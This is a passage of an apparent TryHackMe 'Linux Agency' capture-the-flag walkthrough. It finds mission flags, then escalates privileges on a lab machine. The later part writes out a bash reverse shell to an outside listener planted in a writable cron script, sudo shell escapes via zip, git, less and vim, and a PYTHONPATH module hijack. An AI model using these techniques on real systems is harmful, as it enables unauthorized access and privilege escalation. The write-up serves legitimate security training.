mission17@linuxagency:~$ su mission18
Password: 
mission18@linuxagency:/home/mission17$ cd ../mission18
mission18@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission18 mission18 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission18 mission18    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission18 mission18 3771 Jan 12  2021 .bashrc
-r--------  1 mission18 mission18  312 Jan 12  2021 flag.rb
-rw-r--r--  1 mission18 mission18  807 Jan 12  2021 .profile
mission18@linuxagency:~$ file flag.rb
flag.rb: Ruby script, ASCII text
mission18@linuxagency:~$ head flag.rb 
def encryptDecrypt(string)
    key = ['K', 'C', 'Q']
    result = ""
    codepoints = string.each_codepoint.to_a
    codepoints.each_index do |i|
        result += (codepoints[i] ^ 'Z'.ord).chr
    end
    result
end

mission18@linuxagency:~$ 
```

This time we have Ruby source file. No need to compile, we can run it directly.

```bash
mission18@linuxagency:~$ ruby flag.rb 
mission19{<REDACTED>}
mission18@linuxagency:~$ 
```

Answer: `mission19{<REDACTED>}`

#### What is the mission20 flag?

Hint: I can see you ^_^

```bash
mission18@linuxagency:~$ su mission19
Password: 
mission19@linuxagency:/home/mission18$ cd ../mission19
mission19@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission19 mission19 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission19 mission19    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission19 mission19 3771 Jan 12  2021 .bashrc
-r--------  1 mission19 mission19  276 Jan 12  2021 flag.c
-rw-r--r--  1 mission19 mission19  807 Jan 12  2021 .profile
mission19@linuxagency:~$ file flag.c 
flag.c: C source, ASCII text
mission19@linuxagency:~$ head flag.c 
#include<stdio.h>
int main()
{
    char flag[] = "gcyyced8:qh:>28l3o3:i2kn8>8;hl>9?9in2oko;iw";
    int length = strlen(flag);
    for (int i = 0 ; i < length ; i++)
    {
        flag[i] = flag[i] ^ 10;
        printf("%c",flag[i]);
    }
mission19@linuxagency:~$ 
```

Yet another programming language. Now we have a C source file.

We compile it, make sure the result is executable and then run it.

```bash
mission19@linuxagency:~$ gcc flag.c -o flag
flag.c: In function ‘main’:
flag.c:5:18: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
     int length = strlen(flag);
                  ^
flag.c:5:18: warning: incompatible implicit declaration of built-in function ‘strlen’
flag.c:5:18: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
mission19@linuxagency:~$ chmod +x flag
mission19@linuxagency:~$ ./flag 
mission20{<REDACTED>}

mission19@linuxagency:~$ 
```

Answer: `mission20{<REDACTED>}`

#### What is the mission21 flag?

Hint: Beware this snake is too venomous. Keep some Anti-Venom Handy...

```bash
mission19@linuxagency:~$ su mission20
Password: 
mission20@linuxagency:/home/mission19$ cd ../mission20
mission20@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission20 mission20 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission20 mission20    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission20 mission20 3771 Jan 12  2021 .bashrc
-r--------  1 mission20 mission20  186 Jan 12  2021 flag.py
-rw-r--r--  1 mission20 mission20  807 Jan 12  2021 .profile
mission20@linuxagency:~$ file flag.py 
flag.py: ASCII text
mission20@linuxagency:~$ head flag.py 
flag = ">:  :<=ab(d76dfe2210fak1gge5e61`kgbj`bk5c0."
for i in range(len(flag)):
    flag = (flag[:i] + chr(ord(flag[i]) ^ ord("S")) +flag[i + 1:]);
    print(flag[i], end = "");
print()
mission20@linuxagency:~$ 
```

Now we have a Python program. It can be executed directly without compilation.

```bash
mission20@linuxagency:~$ python flag.py 
mission21{<REDACTED>}
mission20@linuxagency:~$ 
```

Answer: `mission21{<REDACTED>}`

#### What is the mission22 flag?

Hint: shhhh!!!

```bash
mission20@linuxagency:~$ su mission21
Password: 
$ pwd
/home/mission20
$ cd ../mission21
$ bash
mission22{<REDACTED>}
mission21@linuxagency:~$ 
```

Answer: `mission22{<REDACTED>}`

#### What is the mission23 flag?

Hint: Sh!oot! We are surrounded by snakes and need a good way to escape from here...

```bash
mission21@linuxagency:~$ su mission22
Password: 
Python 3.6.9 (default, Oct  8 2020, 12:12:24) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```

We are dropped directly into Python. But we can spawn a normal Bash shell and then get the flag.

```bash
>>> import pty
>>> pty.spawn("/bin/bash")
mission22@linuxagency:/home/mission21$ cd ../mission22
mission22@linuxagency:~$ ls -la
total 24
drwxr-x---  2 mission22 mission22 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission22 mission22    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission22 mission22 3771 Jan 12  2021 .bashrc
-r--------  1 mission22 mission22   44 Jan 12  2021 flag.txt
-rw-r--r--  1 mission22 mission22  807 Jan 12  2021 .profile
-rw-------  1 mission22 mission22  140 Jan 12  2021 .python_history
mission22@linuxagency:~$ cat flag.txt 
mission23{<REDACTED>}
mission22@linuxagency:~$ 
```

Answer: `mission23{<REDACTED>}`

#### What is the mission24 flag?

Hint: Maybe you will need a Hair Straightener here.

```bash
mission22@linuxagency:~$ su mission23
Password: 
mission23@linuxagency:/home/mission22$ cd ../mission23
mission23@linuxagency:~$ ls -la
total 24
drwxr-x---  3 mission23 mission23 4096 Jan 15  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission23 mission23    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission23 mission23 3771 Jan 12  2021 .bashrc
drwxrwxr-x  3 mission23 mission23 4096 Jan 12  2021 .local
-r--------  1 mission23 mission23   69 Jan 15  2021 message.txt
-rw-r--r--  1 mission23 mission23  807 Jan 12  2021 .profile
mission23@linuxagency:~$ cat message.txt 
The hosts will help you.
[OPTIONAL] Maybe you will need curly hairs.
mission23@linuxagency:~$ 
```

We are hinted to check out the `/etc/hosts` file and use `curl`.

```bash
mission23@linuxagency:~$ cat /etc/hosts
127.0.0.1       localhost       linuxagency     mission24.com
127.0.1.1       ubuntu  linuxagency

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback      linuxagency
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
mission23@linuxagency:~$ curl -s http://mission24.com | grep mission
    <title>mission24{<REDACTED>}</title>
mission23@linuxagency:~$ 
```

Answer: `mission24{<REDACTED>}`

#### What is the mission25 flag?

Hint: Send the money to another country

```bash
mission23@linuxagency:~$ su mission24
Password: 
mission24@linuxagency:/home/mission23$ cd ../mission24
mission24@linuxagency:~$ ls -la
total 40
drwxr-x---  3 mission24 mission24 4096 Feb  1  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission24 mission24    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission24 mission24 3771 Jan 12  2021 .bashrc
-rwxr-xr-x  1 mission24 mission24 8576 Jan 12  2021 bribe
drwxr-xr-x  3 mission24 mission24 4096 Jan 12  2021 .local
-rw-r--r--  1 mission24 mission24  807 Jan 12  2021 .profile
-rw-------  1 mission24 mission24 4934 Jan 12  2021 .viminfo
mission24@linuxagency:~$ file bribe
bribe: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=006516d8c62bb8a5f5a41595ce4529d4bcb159b8, not stripped
mission24@linuxagency:~$ ./bribe


There is a guy who is smuggling flags
Bribe this guy to get the flag
Put some money in his pocket to get the flag

Words are not the price for your flag
Give Me money Man!!!

mission24@linuxagency:~$ 
```

To get more information about what the program is doing we can run it with `ltrace`.

```bash
mission24@linuxagency:~$ ltrace ./bribe 
getenv("pocket")                                                                                                     = nil
getenv("init")                                                                                                       = nil
puts("\n\nThere is a guy who is smugglin"...

There is a guy who is smuggling flags
)                                                                        = 40
puts("Bribe this guy to get the flag"Bribe this guy to get the flag
)                                                                               = 31
puts("Put some money in his pocket to "...Put some money in his pocket to get the flag
)                                                                          = 45
system("export init=abc" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                               = 0
puts("\nWords are not the price for you"...
Words are not the price for your flag
)                                                                         = 39
puts("Give Me money Man!!!\n"Give Me money Man!!!

)                                                                                       = 22
+++ exited (status 0) +++
mission24@linuxagency:~$ 
```

Tho environment variables (`pocket` and `init`) are accessed.

Let's set `pocket` variable to `money` and run the program again.

```bash
mission24@linuxagency:~$ export pocket=money
mission24@linuxagency:~$ ./bribe
Here ya go!!!
mission25{<REDACTED>}
Don't tell police about the deal man ;)

mission24@linuxagency:~$ 
```

And we get the flag!

Answer: `mission25{<REDACTED>}`

#### What is the mission26 flag?

Hint: If no one comes to hear your call! Let's go alone.

```bash
mission24@linuxagency:~$ su mission25
Password: 
mission25@linuxagency:/home/mission24$ cd ../mission25
mission25@linuxagency:~$ ls -la
bash: ls: No such file or directory
mission25@linuxagency:~$ pwd
/home/mission25
mission25@linuxagency:~$ ls -la
bash: ls: No such file or directory
mission25@linuxagency:~$ cd ..
mission25@linuxagency:/home$ ls -ld mission25
bash: ls: No such file or directory
mission25@linuxagency:/home$ which ls
bash: which: No such file or directory
mission25@linuxagency:/home$ echo $PATH

mission25@linuxagency:/home$ 
```

Hhm, our `PATH` variable is empty. We will need to set it to something normal.

```bash
mission25@linuxagency:/home$ export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
mission25@linuxagency:/home$ cd mission25
mission25@linuxagency:~$ ls -la
total 24
drwxr-x---  3 mission25 mission25 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission25 mission25    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission25 mission25 3783 Jan 12  2021 .bashrc
-rw-r--r--  1 mission25 mission25   44 Jan 12  2021 flag.txt
drwxr-xr-x  3 mission25 mission25 4096 Jan 12  2021 .local
-rw-r--r--  1 mission25 mission25  807 Jan 12  2021 .profile
mission25@linuxagency:~$ cat flag.txt
mission26{<REDACTED>}
mission25@linuxagency:~$ 
```

Answer: `mission26{<REDACTED>}`

#### What is the mission27 flag?

Hint: A wire of my guitar is broken. Wait "wire" huh.....

```bash
mission25@linuxagency:~$ su mission26
Password: 
mission26@linuxagency:/home/mission25$ cd ../mission26
mission26@linuxagency:~$ ls -la
total 100
drwxr-x---  2 mission26 mission26  4096 Jan 12  2021 .
drwxr-xr-x 45 root      root       4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission26 mission26     9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission26 mission26  3771 Jan 12  2021 .bashrc
-r--------  1 mission26 mission26 85980 Jan 12  2021 flag.jpg
-rw-r--r--  1 mission26 mission26   807 Jan 12  2021 .profile
mission26@linuxagency:~$ file flag.jpg 
flag.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 100x100, segment length 16, comment: "mission27{444d29b932124a48e7dddc0595788f4d}", progressive, precision 8, 1000x1870, frames 3
mission26@linuxagency:~$ 
```

Hhm, the flag file is a JPEG image. Let's check it for strings.

```bash
mission26@linuxagency:~$ strings flag.jpg | grep mission
-mission27{<REDACTED>}
mission26@linuxagency:~$ 
```

And there we got the flag.

Answer: `mission27{<REDACTED>}`

#### What is the mission28 flag?

Hint: Maybe you will need a reality stone like one which thanos had, in order to remove this illusion.

```bash
mission26@linuxagency:~$ su mission27
Password: 
mission27@linuxagency:/home/mission26$ cd ../mission27
mission27@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission27 mission27 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission27 mission27    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission27 mission27 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission27 mission27  136 Jan 12  2021 flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
-rw-r--r--  1 mission27 mission27  807 Jan 12  2021 .profile
mission27@linuxagency:~$ file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz 
flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz: gzip compressed data, was "flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png", last modified: Mon Jan 11 06:42:10 2021, from Unix
mission27@linuxagency:~$ 
```

Not sure if we can trust/expect all these extensions to be valid but let's start to unpack it.

```bash
mission27@linuxagency:~$ gunzip flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz 
mission27@linuxagency:~$ file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png 
flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png: GIF image data, version 87a, 27914 x 29545
mission27@linuxagency:~$ strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png | grep mission
mission28{<REDACTED>}
mission27@linuxagency:~$ 
```

Answer: `mission28{<REDACTED>}`

#### What is the mission29 flag?

Hint: Wow!! I am in a mine full of red diamonds. But, I am hungry, somebody let me out..... #crying

```bash
mission27@linuxagency:~$ su mission28
Password: 
irb(main):001:0> 
```

We are dropped directly into a Ruby shell. But we can start a normal Bash shell with `exec`.

```bash
irb(main):001:0> exec "/bin/bash"
mission28@linuxagency:/home/mission27$ cd ../mission28
mission28@linuxagency:~$ ls -la
total 40
drwxr-x---  3 mission28 mission28 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission28 mission28    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission28 mission28  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 mission28 mission28 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission28 mission28 8980 Jan 12  2021 examples.desktop
drwxr-xr-x  3 mission28 mission28 4096 Jan 12  2021 .local
-rw-r--r--  1 mission28 mission28  807 Jan 12  2021 .profile
-r--------  1 mission28 mission28   44 Jan 12  2021 txt.galf
mission28@linuxagency:~$ cat txt.galf 
}<REDACTED>{92noissim
mission28@linuxagency:~$ cat txt.galf | rev
mission29{<REDACTED>}
mission28@linuxagency:~$ 
```

Answer: `mission29{<REDACTED>}`

#### What is the mission30 flag?

Hint: Maybe!! You need to know how to set authentication on websites.

```bash
mission28@linuxagency:~$ su mission29
Password: 
mission29@linuxagency:/home/mission28$ cd ../mission29
mission29@linuxagency:~$ ls -la
total 20
drwxr-x---  3 mission29 mission29 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission29 mission29    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission29 mission29 3771 Jan 12  2021 .bashrc
drwxr-xr-x  7 mission29 mission29 4096 Jan 12  2021 bludit
-rw-r--r--  1 mission29 mission29  807 Jan 12  2021 .profile
mission29@linuxagency:~$ cd bludit/
mission29@linuxagency:~/bludit$ ls -la
total 44
drwxr-xr-x  7 mission29 mission29 4096 Jan 12  2021 .
drwxr-x---  3 mission29 mission29 4096 Jan 12  2021 ..
drwxr-xr-x  2 mission29 mission29 4096 Jan 12  2021 bl-content
drwxr-xr-x 10 mission29 mission29 4096 Jan 12  2021 bl-kernel
drwxr-xr-x  2 mission29 mission29 4096 Jan 12  2021 bl-languages
drwxr-xr-x 27 mission29 mission29 4096 Jan 12  2021 bl-plugins
drwxr-xr-x  4 mission29 mission29 4096 Jan 12  2021 bl-themes
-rw-r--r--  1 mission29 mission29  394 Jan 12  2021 .htaccess
-rw-r--r--  1 mission29 mission29   44 Jan 12  2021 .htpasswd
-rw-r--r--  1 mission29 mission29  900 Jan 12  2021 index.php
-rw-r--r--  1 mission29 mission29 1083 Jan 12  2021 LICENSE
mission29@linuxagency:~/bludit$ 
```

The hint talks about authentication so let's check `.htpasswd`.

```bash
mission29@linuxagency:~/bludit$ cat .htpasswd 
mission30{<REDACTED>}
mission29@linuxagency:~/bludit$ 
```

Answer: `mission30{<REDACTED>}`

#### What is viktor's Flag?

Hint: You will need a time machine used by programmers.

```bash
mission29@linuxagency:~/bludit$ cd ..
mission29@linuxagency:~$ su mission30
Password: 
mission30@linuxagency:/home/mission29$ cd ../mission30
mission30@linuxagency:~$ ls -la
total 36
drwxr-x---  3 mission30 mission30 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission30 mission30    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission30 mission30  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 mission30 mission30 3771 Jan 12  2021 .bashrc
drwxr-xr-x  3 mission30 mission30 4096 Jan 12  2021 Escalator
-rw-r--r--  1 mission30 mission30 8980 Jan 12  2021 examples.desktop
-rw-r--r--  1 mission30 mission30  807 Jan 12  2021 .profile
mission30@linuxagency:~$ cd Escalator/
mission30@linuxagency:~/Escalator$ ls -la
total 16
drwxr-xr-x 3 mission30 mission30 4096 Jan 12  2021 .
drwxr-x--- 3 mission30 mission30 4096 Jan 12  2021 ..
drwxr-xr-x 8 mission30 mission30 4096 Jan 12  2021 .git
-rw-r--r-- 1 mission30 mission30   35 Jan 12  2021 sources.py
mission30@linuxagency:~/Escalator$ 
```

We are in a Git repository. Let's start by checking the log.

```bash
mission30@linuxagency:~/Escalator$ git log
commit 24cbf44a9cb0e65883b3f76ef5533a2b2ef96497 (HEAD -> master, origin/master)
Author: root <root@Xyan1d3>
Date:   Mon Jan 11 15:37:56 2021 +0530

    My 1st python Script

commit e0b807dbeb5aba190d6307f072abb60b34425d44
Author: root <root@Xyan1d3>
Date:   Mon Jan 11 15:36:40 2021 +0530

    Your flag is viktor{<REDACTED>}
mission30@linuxagency:~/Escalator$ 
```

And there we have the flag!

Answer: `viktor{<REDACTED>}`

---------------------------------------------------------------------------------------

### Task 4: Privilege Escalation

Welcome to Privilege Escalation, 47. Glad you made it this far!!! Now, here are some special targets. Your Target is to teach these bad guys a lesson.

Good luck 47!!!!

#### Mission Active

---------------------------------------------------------------------------------------

#### su into viktor user using viktor's flag as password

```bash
mission30@linuxagency:~/Escalator$ cd ..
mission30@linuxagency:~$ su viktor
Password: 
viktor@linuxagency:/home/mission30$ cd ../viktor
viktor@linuxagency:~$ ls -la
total 44
drwxr-x---  5 viktor viktor 4096 Jan 12  2021 .
drwxr-xr-x 45 root   root   4096 Jan 12  2021 ..
lrwxrwxrwx  1 viktor viktor    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 viktor viktor  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 viktor viktor 3771 Jan 12  2021 .bashrc
drwx------  2 viktor viktor 4096 Jan 12  2021 .cache
-rw-r--r--  1 viktor viktor 8980 Jan 12  2021 examples.desktop
drwx------  3 viktor viktor 4096 Jan 12  2021 .gnupg
drwxr-xr-x  3 viktor viktor 4096 Jan 12  2021 .local
-rw-r--r--  1 viktor viktor  807 Jan 12  2021 .profile
viktor@linuxagency:~$ 
```

#### What is dalia's flag?

Hint: Train arrives at the station as per schedule.

We start by checking the global cron jobs.

```bash
viktor@linuxagency:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   dalia   sleep 30;/opt/scripts/47.sh
*  *    * * *   root    echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;
#
viktor@linuxagency:~$ 
```

We have a `/opt/scripts/47.sh` script that runs as `dalia` every minute.

Let's check out the permissions and contents of the script.

```bash
viktor@linuxagency:~$ ls -la /opt/scripts/47.sh
-rwxr-xr-x 1 viktor viktor 106 Aug 25 08:08 /opt/scripts/47.sh
viktor@linuxagency:~$ cat /opt/scripts/47.sh
#!/bin/bash
#echo "Hello 47"
rm -rf /dev/shm/
#echo "Here time is a great matter of essence"
rm -rf /tmp/
viktor@linuxagency:~$ 
``´

Since we have write access to the script we can change its contents.

We change it to create a reverse shell for us.

```bash
viktor@linuxagency:~$ date
Tue Aug 25 08:19:43 PDT 2026
viktor@linuxagency:~$ date
Tue Aug 25 08:20:04 PDT 2026
viktor@linuxagency:~$ vi /opt/scripts/47.sh
viktor@linuxagency:~$ cat /opt/scripts/47.sh
#!/bin/bash

/bin/bash -i >& /dev/tcp/192.168.152.166/12345 0>&1

viktor@linuxagency:~$ 
```

Then we wait a minute for it to execute.

Back at our netcat listener, we get a connection.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Agency]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.152.166] from (UNKNOWN) [10.113.141.190] 51948
bash: cannot set terminal process group (2348): Inappropriate ioctl for device
bash: no job control in this shell
dalia@linuxagency:~$ id
id
uid=1034(dalia) gid=1034(dalia) groups=1034(dalia)
dalia@linuxagency:~$ pwd
pwd
/home/dalia
dalia@linuxagency:~$ ls -l
ls -l
total 16
-rw-r--r-- 1 dalia dalia 8980 Jan 12  2021 examples.desktop
-r-------- 1 dalia dalia   40 Jan 12  2021 flag.txt
dalia@linuxagency:~$ cat flag.txt
cat flag.txt
dalia{<REDACTED>}
dalia@linuxagency:~$ 
```

Answer: `dalia{<REDACTED>}`

Next, we upgrade/fix our shell so it survives a `Ctrl` + `C`.

```bash
dalia@linuxagency:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
dalia@linuxagency:~$ ^Z
zsh: suspended  nc -lvnp 12345

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Agency]
└─$ stty raw -echo ; fg ; reset 
[1]  + continued  nc -lvnp 12345

dalia@linuxagency:~$ export SHELL=/bin/bash
dalia@linuxagency:~$ export TERM=xterm-256color
dalia@linuxagency:~$ stty rows 200 columns 200
dalia@linuxagency:~$ ^C
dalia@linuxagency:~$ 
```

#### What is silvio's flag?

Hint: Check the Postal Code on the address.

One standard thing to check is what we can do with `sudo`.

```bash
dalia@linuxagency:~$ sudo -l
Matching Defaults entries for dalia on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dalia may run the following commands on linuxagency:
    (silvio) NOPASSWD: /usr/bin/zip
dalia@linuxagency:~$ 
```

As usual [GTFOBins](https://gtfobins.org/gtfobins/zip/) inform us on how to proceed.

```bash
dalia@linuxagency:~$ TF=$(mktemp -u)
dalia@linuxagency:~$ sudo -u silvio /usr/bin/zip $TF /etc/hosts -T -TT '/bin/sh #'
  adding: etc/hosts (deflated 37%)
$ id
uid=1032(silvio) gid=1032(silvio) groups=1032(silvio)
$ cd /home/silvio
$ ls
examples.desktop  flag.txt
$ cat flag.txt
silvio{<REDACTED>}
$ 
```

Answer: `silvio{<REDACTED>}`

#### What is reza's flag?

Hint: We need master's in EVS for helping us to build a time machine.

Once again we check what we can do with `sudo`.

```bash
$ sudo -l
Matching Defaults entries for silvio on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User silvio may run the following commands on linuxagency:
    (reza) SETENV: NOPASSWD: /usr/bin/git
$ 
```

And again [GTFOBins](https://gtfobins.org/gtfobins/git/) come to the rescue.

```bash
$ sudo -u reza PAGER='/bin/sh -c "exec sh 0<&1"' /usr/bin/git -p help
$ id
uid=1033(reza) gid=1033(reza) groups=1033(reza)
$ cd /home/reza
$ ls -la
total 40
drwxr-x---  3 reza reza 4096 Jan 12  2021 .
drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
lrwxrwxrwx  1 reza reza    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 reza reza  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 reza reza 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 reza reza 8980 Jan 12  2021 examples.desktop
-r--------  1 reza reza   39 Jan 12  2021 flag.txt
drwxr-xr-x  3 reza reza 4096 Jan 12  2021 .local
-rw-r--r--  1 reza reza  807 Jan 12  2021 .profile
$ cat flag.txt
reza{<REDACTED>}
$ 
```

Answer: `reza{<REDACTED>}`

#### What is jordan's flag?

Hint: Need to find a way to distract the snake and sneak into the gun shop.

We start by checking `sudo -l`.

```bash
$ sudo -l
Matching Defaults entries for reza on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User reza may run the following commands on linuxagency:
    (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
$ 
```

We can run a Python-script. Let's check it out.

```bash
$ ls -l /opt/scripts/Gun-Shop.py
-r-x------ 1 jordan jordan 454 Jan 12  2021 /opt/scripts/Gun-Shop.py
$ cat /opt/scripts/Gun-Shop.py
cat: /opt/scripts/Gun-Shop.py: Permission denied
$ sudo -u jordan /opt/scripts/Gun-Shop.py
Traceback (most recent call last):
  File "/opt/scripts/Gun-Shop.py", line 2, in <module>
    import shop
ModuleNotFoundError: No module named 'shop'
$ 
```

The script is looking for (the missing) `shop` module. Let's add one in the `tmp` directory.

```bash
$ vi /tmp/shop.py
$ cat /tmp/shop.py
#!/usr/bin/python

import os
os.system("/bin/bash -p")

$ chmod +x shop.py
$ 
``´

Now we can execute the script again and set the `PYTHONPATH` environment variable.

```bash
$ sudo -u jordan PYTHONPATH=/tmp /opt/scripts/Gun-Shop.py
jordan@linuxagency:/home/reza$ cd ../jordan
jordan@linuxagency:~$ cat flag.txt
}<REDACTED>{nadroj
jordan@linuxagency:~$ cat flag.txt | rev
jordan{<REDACTED>}
jordan@linuxagency:~$ 
```

Answer: `jordan{<REDACTED>}`

#### What is ken's flag?

Hint: Exam's coming revise your lessons properly.

We start by checking `sudo -l`.

```bash
jordan@linuxagency:~$ sudo -l
Matching Defaults entries for jordan on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jordan may run the following commands on linuxagency:
    (ken) NOPASSWD: /usr/bin/less
jordan@linuxagency:~$ 
```

Once again [GTFOBins](https://gtfobins.org/gtfobins/less/) guide us.

First we launch `less`.

```bash
jordan@linuxagency:~$ sudo -u ken /usr/bin/less /etc/hosts
```

And then we get a shell with `!/bin/bash` inside `less`.

```bash
jordan@linuxagency:~$ sudo -u ken /usr/bin/less /etc/hosts
ken@linuxagency:/home/jordan$ cd ../ken
ken@linuxagency:~$ cat flag.txt
ken{<REDACTED>}
ken@linuxagency:~$ 
```

Answer: `ken{<REDACTED>}`

#### What is sean's flag?

Hint: Maybe you need a green Indian dish wash Bar ?

We start by checking `sudo -l`.

```bash
ken@linuxagency:~$ sudo -l
Matching Defaults entries for ken on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ken may run the following commands on linuxagency:
    (sean) NOPASSWD: /usr/bin/vim
ken@linuxagency:~$ sudo -u sean vim -c ':!/bin/bash'

sean@linuxagency:/home/ken$ cd ../sean
sean@linuxagency:~$ cat flag.txt
cat: flag.txt: No such file or directory
sean@linuxagency:~$ ls -la
total 36
drwxr-x---  2 sean sean 4096 Aug 25 09:20 .
drwxr-xr-x 45 root root 4096 Jan 12  2021 ..
lrwxrwxrwx  1 sean sean    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 sean sean  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 sean sean 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 sean sean 8980 Jan 12  2021 examples.desktop
-rw-r--r--  1 sean sean  807 Jan 12  2021 .profile
-rw-------  1 sean sean  558 Aug 25 09:20 .viminfo
sean@linuxagency:~$ pwd
/home/sean
sean@linuxagency:~$ 
```

But there is no `flag.txt` for us.

Checking our privileges we notice that we are in the `adm` group.

```bash
sean@linuxagency:~$ id
